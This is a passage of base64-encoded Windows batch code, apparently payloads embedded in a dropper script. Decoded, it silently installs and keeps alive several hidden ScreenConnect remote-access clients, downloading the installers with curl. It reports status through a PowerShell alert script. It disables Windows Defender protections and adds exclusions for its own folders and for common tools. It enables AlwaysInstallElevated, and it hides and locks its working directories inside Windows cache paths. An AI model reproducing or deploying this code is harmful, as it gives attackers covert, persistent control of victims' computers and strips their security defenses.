IiFHRVhJVCEiPT0iMTYxOCIgKA0KICAgIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICAg
IG1zaWV4ZWMgL2kgIiVNU0lfRyUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJl
YWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2dyeXhhMi5sb2ciID4+IiVMT0clIiAyPiYxDQog
ICAgc2V0ICJHRVhJVD0hRVJST1JMRVZFTCEiDQogICAgZWNobyBncnl4YV9tc2lleGVjX3JldHJ5
MTYxOD0hR0VYSVQhPj4iJUxPRyUiDQogICkNCiAgaWYgIiFHRVhJVCEiPT0iMTYxOCIgKA0KICAg
IHRpbWVvdXQgL3QgNDUgL25vYnJlYWsgPm51bA0KICAgIG1zaWV4ZWMgL2kgIiVNU0lfRyUiIC9x
biAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVc
bXNpX2dyeXhhMy5sb2ciID4+IiVMT0clIiAyPiYxDQogICAgc2V0ICJHRVhJVD0hRVJST1JMRVZF
TCEiDQogICAgZWNobyBncnl4YV9tc2lleGVjX3JldHJ5MTYxOGI9IUdFWElUIT4+IiVMT0clIg0K
ICApDQogIHRpbWVvdXQgL3QgMTAgL25vYnJlYWsgPm51bA0KKSBlbHNlICgNCiAgZWNobyBncnl4
YV9tc2lfZmV0Y2hfRkFJTD4+IiVMT0clIg0KKQ0KDQpyZW0gNSkgcG9zdC1pbnN0YWxsOiByZXBh
aXIgaWYgc3ZjIHN0aWxsIG1pc3NpbmcsIHRoZW4gZm9yY2Ugc3RhcnQNCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAx
IGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGVjaG8gZ3J5eGFfcG9zdGluc3RhbGxf
cmVwYWlyPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
cmVwYWlyIC1GcCAiJUdSWVhBX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQog
IHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQopDQpzYyBjb25maWcgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglR1JZWEFfRlAlKSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYyBmYWlsdXJlICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCA+bnVsIDI+JjENCnNjIHN0YXJ0
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KdGltZW91dCAv
dCA1IC9ub2JyZWFrID5udWwNCnNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhB
X0ZQJSkiID5udWwgMj4mMQ0KdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCnNjIHN0YXJ0ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KDQpyZW0gbXNpZXhl
YyBvZiBncnl4YSBjYW4gZGlzdHVyYiBzZXZyeiAtIG51ZGdlIGtlZXBlcnMgYmFjayB1cA0Kc2Mg
Y29uZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgc3RhcnQ9IGF1dG8gPm51
bCAyPiYxDQpzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwg
Mj4mMQ0Kc2MgY29uZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiBzdGFydD0g
YXV0byA+bnVsIDI+JjENCnNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUp
IiA+bnVsIDI+JjENCmNhbGwgOlJlc3RvcmVBbHQNCg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3Js
ZXZlbCAxICgNCiAgc2V0ICJHUllYQV9PSz0xIg0KICBlY2hvIGdyeXhhX211c3RfcnVubmluZ19v
az4+IiVMT0clIg0KKSBlbHNlICgNCiAgc2V0ICJHUllYQV9PSz0wIg0KICBlY2hvIGdyeXhhX211
c3Rfc3RpbGxfZG93bj4+IiVMT0clIg0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVHUllYQV9GUCUpIiA+PiIlTE9HJSIgMj4mMQ0KKQ0KZXhpdCAvYiAwDQoNCjpJbnN0YWxsTXNp
DQpyZW0gJTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0Kc2V0ICJUQUc9JX4yIg0KZWNobyBb
JVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
LS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwl
IiA+PiIlTE9HJSIgMj4mMQ0KZm9yICUlRiBpbiAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExF
USAxMDAwMDAwICgNCiAgZWNobyBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwg
L2YgL3EgIiVNU0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1T
SSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KY2FsbCA6Tm9Nc2lQb2xpY3kNCnJlbSBNMTM6IHN0
YWxlIHByaW1hcnkgZGlyIChzZXJ2aWNlIGRlbGV0ZWQsIHByb2R1Y3QgdW5yZWdpc3RlcmVkKSBi
cmVha3MNCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gLSBjbGVhciBpdCBiZWZv
cmUgaW5zdGFsbGluZw0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUp
IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVBGODYlXFNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiAoDQogIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW4+
PiIlTE9HJSINCiAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVBfRlAlKSIgPm51bCAyPiYxDQopDQplY2hvIFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxP
RyUiDQptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9
UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0Kc2V0ICJN
U0lFWElUPSFFUlJPUkxFVkVMISINCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQh
Pj4iJUxPRyUiDQppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgNCiAgZWNobyBbJVRBRyVdIG1zaV9i
dXN5X3JldHJ5Pj4iJUxPRyUiDQogIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICBtc2ll
eGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3Vw
cHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjENCiAgc2V0ICJNU0lFWElU
PSFFUlJPUkxFVkVMISINCiAgZWNobyBbJVRBRyVdIG1zaWV4ZWNfcmV0cnkgZXhpdD0hTVNJRVhJ
VCE+PiIlTE9HJSINCikNCmNhbGwgOldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVwYWlyUmVnaXN0
ZXJlZA0KcmVtICUxPWZpbmdlcnByaW50IC0gc2VydmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJl
Z2lzdGVyZWQ6IHJlcGFpciBieSBHVUlELg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglfjEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQppZiBub3Qg
ZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2IgMQ0KcG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25f
bGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9H
JSIgMj4mMQ0KY2FsbCA6V2FpdFN2Yw0KZXhpdCAvYiAwDQoNCjpSZXN0b3JlQWx0DQpyZW0gQUxU
IHNlcnZpY2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAoU0MtZmFtaWx5IG1zaWV4ZWMgc2lk
ZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVu
dCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQpl
Y2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0dGVtcHQ+PiIlTE9HJSINCmlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
ciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCnNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
CmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSINCmV4aXQgL2IgMA0KDQo6Tm9Nc2lQ
b2xpY3kNCnJlZyBkZWxldGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
d3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtD
VVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2Fi
bGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jv
c29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAv
ZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0KDQo6V2FpdFN2Yw0Kc2V0ICJUUklFUz0wIg0KOldhaXRM
b29wDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
UlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEi
DQogIHNldCAiUFJJTV9PSz0xIg0KICBleGl0IC9iIDANCikNCnNldCAvYSBUUklFUys9MQ0KaWYg
JVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxDQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5udWwgMj4mMQ0K
Z290byA6V2FpdExvb3ANCg0KOlRnU3RhdGUNCnNldCAiTkVXU1RBVEU9JX4xIg0Kc2V0ICJNU0c9
JX4yIg0Kc2V0ICJPTERTVEFURT0iDQppZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRF
PTwiJVNUQVRFJSINCnJlbSBmYWxzZSBET1dOIGFmdGVyIHJlYm9vdCByYWNlOiBwcmltYXJ5IGFs
cmVhZHkgUnVubmluZyDigJQgZG8gbm90IHNwYW0NCmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04i
ICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQg
IlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0Z19za2lw
X2Rvd25fYWxyZWFkeV9ydW5uaW5nPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCnJl
bSByYXRlLWxpbWl0IHJlcGVhdGVkIERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDZoIHdoaWxl
IHN0dWNrDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHByZXNzDQpp
ZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHByZXNzDQpnb3RvIDpTZW5k
QWxlcnQNCjpNYXliZVN1cHByZXNzDQppZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBp
ZiBleGlzdCAiJVdEJVx0Z19zZW50LmZsYWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVt
IC1MaXRlcmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1p
bnV0ZXMgLWx0IDM2MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYxDQogIGlmIG5vdCBl
cnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUi
DQogICAgZXhpdCAvYiAwDQogICkNCikNCjpTZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNU
QVRFJSINCmVjaG8gc2VudD4iJVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRn
X3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIgLUJ1aWxkICVN
T05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUl
IHNlbnQ+PiIlTE9HJSINCmV4aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM3IC0gZ3J5eGEga2VlcCAr
IGlkZW50aXR5LWF3YXJlIHRhc2sgQUNMICsgRGlzYWJsZU1TSSBuZXV0cmFsaXplICsgZXhjbHVz
aW9ucy9BQ0w7IG5vIGF0dHItbG9jayBvbiBtdXRhYmxlIHBheWxvYWRzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiR1JZWEE9U2NyZWVuQ29ubmVjdCBDbGllbnQgKDk5MDgxOThlNjY4ZTQ3NTApIg0Kc2V0
ICJLRUVQMT01ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0K
c2V0ICJLRUVQMz05OTA4MTk4ZTY2OGU0NzUwIg0Kc2V0ICJQRj0lUHJvZ3JhbUZpbGVzJSINCnNl
dCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNLUk9PVD0lU3lzdGVtUm9vdCVc
U3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIgbWtkaXIgIiVXRCUiID5udWwg
Mj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIlIiA+bnVsIDI+JjENCmVjaG8g
c2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzc+PiIlTE9HJSINCg0KUkVNIC0tLSBOZXV0cmFs
aXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0gRGlzYWJsZU1TSTogMD1hbGxv
dywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kg
L2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxX
aW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAv
ZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiByZWdpc3RyeSBleGNsdXNpb25z
IChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQ
b2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZUFudGlTcHl3YXJl
IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQ
b2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIg
L3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
ZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVCZWhhdmlvck1vbml0b3Jpbmcg
L3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAv
diBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpy
ZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0U2Nhbm5pbmcgL3QgUkVHX0RX
T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxX
aW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQg
L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv
d3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIlIiAvdCBSRUdfRFdPUkQgL2Qg
MCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3Mg
RGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRvd3NcVGVtcCIgL3QgUkVHX0RX
T1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxX
aW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlVEVNUCUiIC90IFJFR19EV09S
RCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENs
aWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhz
IiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVu
dCAoJUtFRVAzJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAv
diAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9k
IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dz
IERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVLRUVQMiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIg
L3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAzJSkiIC90IFJFR19EV09SRCAv
ZCAwIC9mID5udWwgMj4mMQ0KZm9yICUlUCBpbiAobXNpZXhlYy5leGUgY3VybC5leGUgY21kLmV4
ZSBwb3dlcnNoZWxsLmV4ZSBjZXJ0dXRpbC5leGUgU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNl
LmV4ZSBTY3JlZW5Db25uZWN0LldpbmRvd3NDbGllbnQuZXhlKSBkbyAoDQogIHJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNz
ZXMiIC92ICIlJVAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KKQ0KDQpSRU0gLS0t
IERlZmVuZGVyOiBsaXZlIE1wUHJlZmVyZW5jZSAoc3Ryb25nZXIgdGhhbiByZWcgYWxvbmUpIC0t
LQ0KcG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUNvbW1hbmQgXg0KICAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50
bHlDb250aW51ZSc7IiBeDQogICJUcnl7U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1l
TW9uaXRvcmluZyAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUJlaGF2aW9yTW9uaXRv
cmluZyAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVl
OyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWV9Q2F0Y2h7fTsi
IF4NCiAgIiRwYXRocz1AKCclV0QlJywnJVdEMiUnLCdDOlxXaW5kb3dzXFRlbXAnLCRlbnY6VEVN
UCwnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSknLCclUEYlXFNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUDIlKScsJyVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAx
JSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpJyk7IiBeDQogICJ0cnl7
JHBhdGhzKz1AKEdldC1DaGlsZEl0ZW0gLVBhdGggJGVudjpQcm9ncmFtRmlsZXMgLUZpbHRlciAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRGlyZWN0b3J5IC1FQSAwIHwgRm9yRWFjaC1PYmplY3Qg
eyRfLkZ1bGxOYW1lfSl9Y2F0Y2h7fTsiIF4NCiAgInRyeXskcGY4Nj1bRW52aXJvbm1lbnRdOjpH
ZXRGb2xkZXJQYXRoKCdQcm9ncmFtRmlsZXNYODYnKTsgaWYoJHBmODYpeyRwYXRocys9QChHZXQt
Q2hpbGRJdGVtIC1QYXRoICRwZjg2IC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURp
cmVjdG9yeSAtRUEgMCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfX1jYXRjaHt9OyIg
Xg0KICAiZm9yZWFjaCgkcCBpbiAoJHBhdGhzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlKSl7IGlm
KCRwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApKXsgQWRkLU1wUHJlZmVyZW5jZSAt
RXhjbHVzaW9uUGF0aCAkcCAtRUEgMCB9IH07IiBeDQogICJmb3JlYWNoKCR4IGluIEAoJ21zaWV4
ZWMuZXhlJywnY3VybC5leGUnLCdjbWQuZXhlJywncG93ZXJzaGVsbC5leGUnLCdjZXJ0dXRpbC5l
eGUnLCdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJywnU2NyZWVuQ29ubmVjdC5XaW5k
b3dzQ2xpZW50LmV4ZScpKXsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAkeCAt
RUEgMCB9OyIgXg0KICAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uRXh0ZW5zaW9uICcuY21k
JywnLnBzMScsJy5tc2knIC1FQSAwIiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IG9ubHkgU1lT
VEVNICsgQWRtaW5pc3RyYXRvcnMgb24gcGVyc2lzdCBkaXJzIC0tLQ0KY2FsbCA6TG9ja0RpciAi
JVdEJSINCmNhbGwgOkxvY2tEaXIgIiVXRDIlIg0KDQpSRU0gLS0tIGhpZGUgd29ya2RpcnMgKyBr
ZXkgcGF5bG9hZCBmaWxlcyAtLS0NCmF0dHJpYiAraCArcyAiJVdEJSIgPm51bCAyPiYxDQphdHRy
aWIgK2ggK3MgIiVXRDIlIiA+bnVsIDI+JjENClJFTSBTNTogZG8gTk9UIGhpZGUvbG9jayB0aGUg
